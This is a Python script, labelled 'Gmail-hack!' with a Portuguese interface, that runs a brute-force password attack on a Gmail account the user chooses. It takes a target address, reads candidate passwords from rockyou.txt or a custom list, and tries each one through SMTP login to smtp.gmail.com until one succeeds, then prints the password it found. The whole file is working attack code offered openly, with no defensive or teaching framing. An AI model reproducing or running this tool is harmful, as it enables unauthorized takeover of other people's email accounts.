import smtplib
import sys
from os import system
import os

def arte():
    print("\n")
    print(" ##########################################################")
    print(" #                                                        #")
    print(" #                     \||/                               #")
    print(" #                     |  @___oo                          #")
    print(" #           /\  /\   / (__,,,,|                          #")
    print(" #          ) /^\) ^\/ _)                Gmail-hack!      #")
    print(" #          )   /^\/   _)                Criado por:      #")
    print(" #          )   _ /  / _)                        d4az     #")
    print(" #      /\  )/\/ ||  | )_)       Modificado por           #")
    print(" #     <  >      |(,,) )__)             BlackTrace        #")
    print(" #      ||      /    \)___)\                              #")
    print(" #      | \____(      )___) )___                          #")
    print(" #      \______(_______;;; __;;;                          #")
    print(" #                                                        #")
    print(" #      Inspirado de https://github.com/z9fr/hack-gmail   #")
    print(" #      Pequenas modificações por:                        #")
    print(" #             https://github.com/BlackTracee             #")
    print(" ##########################################################")
    print("\n")
    
try:    
    arte()
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

    smtpserver.ehlo()
    smtpserver.starttls()

    usuario = input(" [*] Digite o endereço Gmail alvo => ")

    print("\n")

    senha = input(" [*] Digite '1' para usar a lista de senhas interna \n [*] Digite '2' para usar uma lista personalizada\n => ")
    
    if senha == '1':
        arquivo_senhas = "rockyou.txt"

    elif senha == '2':
        print("\n")
        arquivo_senhas = input(" [+] Informe o caminho do arquivo da lista de senhas => ")

    else:
        print("\n")
        print("Entrada inválida!")
        sys.exit(1)
    
    try:
        arquivo_senhas = open(arquivo_senhas, "r")

    except Exception as e:
        print(e)
        sys.exit(1)

    for senha in arquivo_senhas:
        try:
            smtpserver.login(usuario, senha)

            print(" [+] Senha encontrada %s" % senha)
            break

        except smtplib.SMTPAuthenticationError:
            print(" [!] Senha incorreta. %s " % senha)

except KeyboardInterrupt:
    print("\n [-] CTRL+C DETECTADO......Saindo \n")

input("Pressione Enter para sair")
os.system("clear")
